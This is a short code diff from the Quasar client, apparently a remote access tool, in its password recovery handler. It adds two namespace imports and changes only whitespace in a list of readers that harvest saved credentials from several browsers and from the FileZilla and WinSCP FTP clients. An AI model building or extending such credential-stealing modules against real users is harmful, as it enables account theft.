@@ -2,6 +2,8 @@
 using Quasar.Client.Recovery.Browsers;
 using Quasar.Client.Recovery.FtpClients;
 using Quasar.Common.Messages;
+using Quasar.Common.Messages.Monitoring.Passwords;
+using Quasar.Common.Messages.other;
 using Quasar.Common.Models;
 using Quasar.Common.Networking;
 using System;
@@ -37,10 +39,10 @@ namespace Quasar.Client.Messages
                 new OperaPassReader(),
                 new OperaGXPassReader(),
                 new EdgePassReader(),
-                new YandexPassReader(),
-                new FirefoxPassReader(),
-                new InternetExplorerPassReader(),
-                new FileZillaPassReader(),
+                new YandexPassReader(), 
+                new FirefoxPassReader(), 
+                new InternetExplorerPassReader(), 
+                new FileZillaPassReader(), 
                 new WinScpPassReader()
             };
 
